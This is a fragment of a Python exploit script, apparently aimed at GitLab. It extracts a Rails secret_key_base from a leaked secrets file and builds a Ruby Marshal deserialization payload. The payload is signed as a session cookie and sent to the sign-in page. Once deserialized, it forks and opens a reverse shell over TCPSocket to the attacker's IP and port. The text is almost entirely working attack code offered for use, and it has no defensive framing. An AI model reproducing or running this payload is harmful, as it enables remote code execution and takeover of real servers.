def parse_secrets(secrets):
  secret_key_base = secrets[secrets.find("secret_key_base: ") + 17:secrets.find("otp_key_base") - 3]
  return secret_key_base

def get_ruby_shit_byte(local_ip, port):
  # ruby marshal REEEEEEEEEEEEEE
  length = len(local_ip) + len(str(port)) - 8
  possible_shit_bytes = "jklmnopqrstuvw"
  return possible_shit_bytes[length]

def build_payload(self, secret):
  payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"{ruby_shit_byte}exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
  payload = payload.replace("{ip}", self.local_ip).replace("{port}", str(self.port)).replace("{ruby_shit_byte}",
                                                                                              self.get_ruby_shit_byte())
  key = hashlib.pbkdf2_hmac("sha1", password=secret.encode(), salt=b"signed cookie", iterations=1000, dklen=64)
  base64_payload = base64.b64encode(payload.encode())
  digest = hmac.new(key, base64_payload, digestmod=hashlib.sha1).hexdigest()
  return base64_payload.decode() + "--" + digest

def send_payload(self, payload):
  cookie = {"experimentation_subject_id": payload}
  result = self.session.get(self.url + "/users/sign_in", cookies=cookie, verify=False)
  print("deploying payload - {}".format(result.status_code))
  